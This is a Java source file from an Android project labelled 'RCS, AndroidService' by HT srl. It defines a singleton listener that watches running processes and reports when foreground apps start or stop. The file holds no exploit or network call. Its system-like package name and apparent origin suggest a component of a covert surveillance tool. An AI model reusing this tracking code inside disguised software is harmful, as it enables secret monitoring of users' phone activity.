/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import java.util.ArrayList;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.RunningProcesses;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class ListenerProcess extends Listener<ProcessInfo> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess";

	private BroadcastMonitorProcess processReceiver;
	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		processReceiver = new BroadcastMonitorProcess();
		processReceiver.start();
		processReceiver.register(this);
	}

	@Override
	protected void stop() {
		processReceiver.unregister();
		processReceiver = null;
	}

	protected int dispatch(RunningProcesses processes) {

		final ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
		if (list == null) {
			return 0;
		}
		currentRunning.clear();

		for (final Object element : list) {
			final RunningAppProcessInfo running = (RunningAppProcessInfo) element;
			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {

				currentRunning.put(running.processName, running);
				if (!lastRunning.containsKey(running.processName)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification): started " + running.processName);
					}
					dispatch(new ProcessInfo(running, ProcessStatus.START));
				} else {
					lastRunning.remove(running.processName);
				}
			}
		}

		for (final Object element : lastRunning.keySet()) {
			final RunningAppProcessInfo norun = lastRunning.get(element);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): stopped " + norun.processName);
			}
			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
		}

		lastRunning = new TreeMap<String, RunningAppProcessInfo>(currentRunning);

		return 0;
	}

}
